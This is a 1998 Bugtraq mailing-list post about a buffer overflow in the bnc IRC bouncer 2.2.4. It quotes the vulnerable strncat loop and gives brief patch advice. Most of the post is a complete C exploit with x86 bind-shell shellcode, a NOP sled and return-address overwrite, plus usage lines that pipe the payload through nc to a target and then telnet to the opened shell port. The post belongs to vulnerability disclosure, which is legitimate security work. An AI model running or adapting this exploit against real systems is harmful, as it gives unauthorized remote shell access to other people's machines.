Date: Sat, 26 Dec 1998 22:47:10 +0000
From: Fernando Ultremare <jamez@SEKURE.ORG>
To: BUGTRAQ@netspace.org
Subject: Re: bnc exploit

It isn't a new bug and only the old versions of bnc are affected. In a
fact, I was thinking that this hole was public because the new version of
bnc is patched.

I've coded a little source that exploits bnc 2.2.4 but it hasn't posted
here before to break some script kiddies that uses this kind of program to
gain access in all systems they can.

The core of bug is in a sequence of strcat's to a buffer with 1024
bytes:

--
                while(tm[0]!='\n'||strlen(buffer)<=0){
                        memset(tm,0,2);
                        if(read(s,tm,1) <= 0){
                                close(s);
                                return;
                        }

                        strncat(buffer,tm,1);
                }
--

To patch, you can limit the loop to 1024 or get the new release of bnc.


--- cut here ---

/*
 * SDI irc bouncer exploit
 *
 * This source exploits a buffer overflow in the bnc,
 * popular irc bouncer, binding a shell.
 *
 * Tested against bnc 2.2.4 running on linux.
 *
 * usage:
 *       lame:~# gcc SDI-bnc.c -o SDI-bnc
 *
 *       lame:~# (SDI-bnc 0; cat) | nc www.lame.org 666
 *                        `-> offset, zero in most cases
 *
 *       lame:~# telnet www.lame.org 10752
 *
 *
 * by jamez and dumped from sekure SDI (www.sekure.org)
 *
 * email: securecode@sekure.org
 *
 * merry christmas and happy 1999 ;)
 *
 */

/* c0nd0r :* */
char bindcode[] =
"\x33\xDB\x33\xC0\xB0\x1B\xCD\x80\x33\xD2\x33\xc0\x8b\xDA\xb0\x06"
"\xcd\x80\xfe\xc2\x75\xf4\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x62"
"\xeb\x62\x5e\x56\xac\x3c\xfd\x74\x06\xfe\xc0\x74\x0b\xeb\xf5\xb0"
"\x30\xfe\xc8\x88\x46\xff\xeb\xec\x5e\xb0\x02\x89\x06\xfe\xc8\x89"
"\x46\x04\xb0\x06\x89\x46\x08\xb0\x66\x31\xdb\xfe\xc3\x89\xf1\xcd"
"\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x2a\x66\x89\x46\x0e\x8d"
"\x46\x0c\x89\x46\x04\x31\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0"
"\x66\xfe\xc3\xcd\x80\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04\xcd\x80\xeb\x04"
"\xeb\x4c\xeb\x52\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xfe\xc3\xcd\x80"
"\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xfe\xc1\xcd\x80\xb0\x3f\xfe\xc1"
"\xcd\x80\xb8\x2e\x62\x69\x6e\x40\x89\x06\xb8\x2e\x73\x68\x21\x40\x89\x46"
"\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e"
"\x08\x8d\x56\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x45\xff\xff"
"\xff\xFF\xFD\xFF\x50\x72\x69\x76\x65\x74\x20\x41\x44\x4D\x63\x72\x65\x77";

#define SIZE 1600
#define NOP 0x90

char buffer[SIZE];

void main(int argc, char * argv[])
{
  int i, x, offset = 0;
  long addr;

  if(argc > 1) offset = atoi(argv[1]);

  addr = 0xbffff6ff + offset; /* evil addr */

  for(i = 0; i < SIZE/3; i++)
     buffer[i] = NOP;

  for(x = 0; x < strlen(bindcode); i++, x++)
     buffer[i] = bindcode[x];

  for (; i < SIZE; i += 4)
  {
     buffer[i  ] =  addr & 0x000000ff;
     buffer[i+1] = (addr & 0x0000ff00) >> 8;
     buffer[i+2] = (addr & 0x00ff0000) >> 16;
     buffer[i+3] = (addr & 0xff000000) >> 24;
  }

  buffer[SIZE - 1] = 0;

  printf("USER %s\n", buffer);

}

--- cut here ---


-- -
uground/sekure team.
secure code adm.
key jamez.sekure.org/jmz.key

